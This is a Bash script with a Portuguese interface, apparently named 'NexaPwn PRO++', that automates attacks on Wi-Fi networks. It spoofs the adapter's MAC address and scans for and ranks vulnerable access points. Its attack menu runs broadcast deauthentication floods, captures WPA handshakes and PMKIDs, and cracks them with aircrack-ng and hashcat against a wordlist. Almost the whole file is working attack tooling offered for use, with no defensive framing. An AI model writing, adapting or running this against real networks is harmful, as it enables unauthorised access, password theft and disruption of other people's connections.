#!/bin/bash

# Autor: Nexamos - AP-Hunter - 2025

neon="\e[96m"
matrix="\e[38;5;46m"
red="\e[91m"
end="\033[0m"

trap sair INT
sair(){ tput cnorm; airmon-ng stop "${iface}mon" &>/dev/null; rm scan* capt* hash* &>/dev/null; clear; exit 0; }

deps(){
for i in aircrack-ng macchanger hcxdumptool hcxpcaptool hashcat wash whiptail; do
command -v $i &>/dev/null || apt install -y $i &>/dev/null
done
}

configura(){
airmon-ng start "$iface" &>/dev/null
ifconfig "${iface}mon" down
macchanger -a "${iface}mon" &>/dev/null
ifconfig "${iface}mon" up
killall dhclient wpa_supplicant &>/dev/null
}

scan_aps(){
rm scan* &>/dev/null
timeout 15 airodump-ng --write scan --output-format csv "${iface}mon" &>/dev/null

aps=""

while IFS=',' read bssid first time channel freq privacy cipher auth essid key; do
    [[ "$privacy" =~ "WPA" ]] && result="WPA"
    [[ "$privacy" =~ "WEP" ]] && result="WEP (fraco)"
    [[ "$privacy" =~ "OPN" ]] && result="ABERTO"
    [[ "$essid" == "" ]] && essid="(OCULTO)"
    [[ "$result" == "" ]] && result="DESCONHECIDO"
    aps+="$bssid ($essid) Canal:$channel | $result\n"
done < <(grep "WPA\|OPN\|WEP" scan-01.csv)

echo -e "$aps" > scan_list.txt

whiptail --title "Scanner de Redes" \
--textbox scan_list.txt 30 90
}

scan_vulneraveis(){
rm scan* wps.txt &>/dev/null

timeout 15 airodump-ng --write scan --output-format csv "${iface}mon" &>/dev/null
timeout 10 wash -i "${iface}mon" > wps.txt 2>/dev/null

echo "" > vulneraveis.txt

while IFS=',' read bssid first time channel freq privacy cipher auth essid key; do
    [[ "$essid" == "" ]] && essid="(OCULTO)"

    vuln=""
    [[ "$privacy" =~ "WPA" ]] && vuln+=" Handshake"
    [[ "$privacy" =~ "WPA" ]] && vuln+=" PMKID"

    grep -q "$bssid" wps.txt && vuln+=" WPS-ATIVO"

    [[ "$vuln" != "" ]] && echo "$bssid - $essid - Canal:$channel =>$vuln" >> vulneraveis.txt

done < <(grep "WPA" scan-01.csv)

whiptail --title "APs Vulneráveis" \
--textbox vulneraveis.txt 25 90
}

ataque_hs(){
xterm -hold -e "airodump-ng ${iface}mon" &
scanPID=$!
essid=$(whiptail --inputbox "Nome do Wi-Fi:" 10 60 3>&1 1>&2 2>&3)
canal=$(whiptail --inputbox "Canal:" 10 60 3>&1 1>&2 2>&3)
kill -9 $scanPID &>/dev/null

xterm -hold -e "airodump-ng -c $canal -w capt --essid \"$essid\" ${iface}mon" &
pidMon=$!

sleep 6
xterm -hold -e "aireplay-ng -0 10 -e \"$essid\" -c FF:FF:FF:FF:FF:FF ${iface}mon" &
pidDeauth=$!

sleep 12; kill -9 $pidMon $pidDeauth &>/dev/null
xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt capt-01.cap"
}

ataque_pmkid(){
timeout 60 hcxdumptool -i "${iface}mon" --enable_status=1 -o capture &>/dev/null
hcxpcaptool -z hash capture &>/dev/null
rm capture &>/dev/null
if [[ -f hash ]]; then
    xterm -hold -e "hashcat -m 16800 hash /usr/share/wordlists/rockyou.txt --force"
else
    whiptail --msgbox "Nenhum PMKID capturado." 10 60
fi
}

menu(){
while true; do
op=$(whiptail --title "NexaPwn PRO++" --menu "Escolha a opção:" 20 70 10 \
1 "Scanner de APs (simples)" \
2 "Scanner de APs Vulneráveis (automático)" \
3 "Ataque Handshake" \
4 "Ataque PMKID" \
5 "Alterar Interface" \
6 "Sair" \
3>&1 1>&2 2>&3)

case $op in
1) configura; scan_aps ;;
2) configura; scan_vulneraveis ;;
3) configura; ataque_hs ;;
4) configura; ataque_pmkid ;;
5) iface=$(whiptail --inputbox "Interface (ex: wlan0):" 10 60 3>&1 1>&2 2>&3) ;;
6) sair ;;
esac
done
}

if [[ $EUID -ne 0 ]]; then echo -e "${red}Execute como root.${end}"; exit 1; fi

deps
iface=$(whiptail --inputbox "Interface Wi-Fi (ex: wlan0):" 10 60 3>&1 1>&2 2>&3)
menu
